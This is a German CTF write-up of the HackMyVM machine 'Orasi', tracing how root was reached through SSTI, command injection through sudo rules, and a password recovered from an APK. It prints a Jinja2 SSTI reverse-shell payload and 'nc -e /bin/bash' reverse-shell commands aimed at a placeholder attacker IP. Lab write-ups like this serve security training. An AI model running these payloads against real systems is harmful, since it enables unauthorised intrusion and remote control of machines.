# Orasi - HackMyVM (Hard)

![Orasi.png](Orasi.png)

## Übersicht

*   **VM:** Orasi
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Orasi)
*   **Schwierigkeit:** Hard
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** [DATUM_HIER_EINFÜGEN]
*   **Original-Writeup:** https://alientec1908.github.io/Orasi_HackMyVM_Hard/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Orasi" zu erlangen. Der Weg dorthin führte über mehrere Eskalationsstufen: Zuerst wurde eine Server-Side Template Injection (SSTI)-Schwachstelle in einer Python/Werkzeug-Webanwendung auf Port 5000 ausgenutzt, um eine Reverse Shell als `www-data` zu erhalten. Anschließend wurde durch Ausnutzung einer unsicheren `sudo`-Regel, die `www-data` erlaubte, ein PHP-Skript (`/home/kori/jail.php`) als Benutzer `kori` auszuführen, zu `kori` eskaliert. In diesem Kontext wurde eine Android-APK-Datei (`irida.apk`, vermutlich von einem nicht dokumentierten Dienst auf Port 9005 heruntergeladen) gefunden. Durch Reverse Engineering dieser APK wurde das Passwort für den Benutzer `irida` (`eye.of.the.tiger()`) extrahiert, was einen Wechsel zu `irida` ermöglichte. Die finale Eskalation zu Root gelang durch Ausnutzung einer weiteren unsicheren `sudo`-Regel, die `irida` erlaubte, ein Python-Skript (`/root/oras.py`) als Root auszuführen. Dieses Skript war anfällig für Code-Injection, da es hex-kodierte Python-Befehle von der Standardeingabe entgegennahm und ausführte.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `lftp`
*   `wfuzz`
*   `curl`
*   IDA Pro/Ghidra (implizit für Binary-Analyse)
*   `crunch`
*   `ffuf`
*   `nc` (netcat)
*   Python3
*   `sudo`
*   `php`
*   `apt-get`
*   `wget`
*   `unzip`
*   `jd-gui`
*   `dex2jar`
*   Standard Linux-Befehle (`cat`, `su`, `id`, `pwd`, `ls`, `chmod`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Orasi" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web/API Enumeration:**
    *   IP-Adresse des Ziels (192.168.2.144 – Abweichung vom ARP-Scan, der .158 fand) identifiziert. Hostname `orasi.vm` (implizit) oder `orasi.hmv` (im Bericht unklar) verwendet.
    *   `nmap`-Scan offenbarte Port 21 (FTP, vsftpd 3.0.3, anonymer Login erfolgreich), 22 (SSH, OpenSSH 7.9p1), 80 (HTTP, Apache 2.4.38) und 5000 (HTTP, Werkzeug httpd 1.0.1 / Python 3.7.3).
    *   Port 80 (Apache) und anonymer FTP zeigten keine direkten Schwachstellen.
    *   Reverse Engineering einer (nicht im Log gezeigten) Binärdatei enthüllte den versteckten Web-Pfad `/sh4d0w$s` auf Port 5000.
    *   Fuzzing dieses Pfades mit `wfuzz` und einer Wortliste aus `crunch` (`l333tt`, `1337leet`) fand den gültigen GET-Parameter `l333tt`.

2.  **Initial Access (SSTI zu RCE als `www-data`):**
    *   Der Endpunkt `/sh4d0w$s?l333tt=[PAYLOAD]` war anfällig für Server-Side Template Injection (SSTI, wahrscheinlich Jinja2).
    *   Ein SSTI-Payload wurde konstruiert, um eine Python3-Reverse-Shell auszuführen:
        `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os,pty;s=socket.socket(...);s.connect(...);...;pty.spawn(...);'").read()}}{%endif%}{% endfor %}`
    *   Nach URL-Kodierung und Senden des Payloads wurde eine Reverse Shell als `www-data` zu einem Netcat-Listener (Port 4444) empfangen.

3.  **Privilege Escalation (von `www-data` zu `kori` via `sudo php`):**
    *   Als `www-data` wurde (impliziert durch `sudo -l`) festgestellt, dass `/bin/php /home/kori/jail.php` als Benutzer `kori` ausgeführt werden durfte.
    *   Das Skript `jail.php` war anfällig für Command Injection über seine Argumente.
    *   Durch Ausführen von `sudo -u kori /bin/php /home/kori/jail.php "nc -e /bin/bash ANGRIFFS_IP 9002"` wurde eine Reverse Shell als `kori` zu einem Netcat-Listener (Port 9002) aufgebaut.

4.  **Privilege Escalation (von `kori` zu `irida` via APK Reverse Engineering):**
    *   Als `kori` wurde eine Android-App-Datei (`irida.apk`) gefunden (vermutlich von einem nicht dokumentierten Dienst auf Port 9005 heruntergeladen).
    *   Mittels `unzip`, `dex2jar` und `jd-gui` wurde die APK-Datei dekompiliert.
    *   Im dekompilierten Code wurde das hartkodierte Passwort `eye.of.the.tiger()` für den Benutzer `irida` gefunden.
    *   Erfolgreicher Wechsel zu `irida` mit `su irida` und dem gefundenen Passwort.
    *   Die User-Flag (`2afb9cbb10c22dc7e154a8c434595948`) wurde in `/home/irida/user.txt` gefunden.

5.  **Privilege Escalation (von `irida` zu `root` via `sudo python` Code Injection):**
    *   `sudo -l` als `irida` zeigte, dass `/usr/bin/python3 /root/oras.py` als `root` ohne Passwort ausgeführt werden durfte.
    *   Das Skript `/root/oras.py` nahm hex-kodierte Python-Befehle von der Standardeingabe entgegen und führte diese aus.
    *   Ein Python-Befehl für eine Reverse Shell (`import('os').system('nc -e /bin/bash ANGRIFFS_IP 9006')`) wurde hex-kodiert.
    *   Durch Ausführen von `python3 -c "print(b\"PAYLOAD\".hex())" | sudo python3 /root/oras.py` wurde der hex-kodierte Payload an das Skript übergeben.
    *   Eine Root-Shell wurde auf einem Netcat-Listener (Port 9006) empfangen.
    *   Die Root-Flag (`b1c17c79773c831cbb9109802059c6b5`) wurde in `/root/root.txt` gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Server-Side Template Injection (SSTI):** Eine Python/Werkzeug-Webanwendung auf Port 5000 war anfällig für SSTI, was zu RCE führte.
*   **Unsichere `sudo`-Regeln:**
    *   `www-data` durfte ein PHP-Skript (`jail.php`) als `kori` ausführen, welches anfällig für Command Injection war.
    *   `irida` durfte ein Python-Skript (`oras.py`) als `root` ausführen, welches hex-kodierte Python-Befehle von stdin entgegennahm und ausführte (Code Injection).
*   **Hardcodierte Credentials in Android APK:** Ein Passwort für den Benutzer `irida` war in einer APK-Datei gespeichert.
*   **Reverse Engineering (Binärdatei & APK):** Analyse einer Binärdatei zur Entdeckung eines versteckten Web-Pfades und Dekompilierung einer APK zur Extraktion von Credentials.
*   **FTP Anonymer Zugriff:** Erlaubte initiales Listing, aber keine direkten Exploits.

## Flags

*   **User Flag (`/home/irida/user.txt`):** `2afb9cbb10c22dc7e154a8c434595948`
*   **Root Flag (`/root/root.txt`):** `b1c17c79773c831cbb9109802059c6b5`

## Tags

`HackMyVM`, `Orasi`, `Hard`, `SSTI`, `Python`, `Werkzeug`, `sudo Exploit`, `Command Injection`, `PHP`, `APK Reverse Engineering`, `Hardcoded Credentials`, `Linux`, `Web`, `Privilege Escalation`, `FTP`, `Apache`
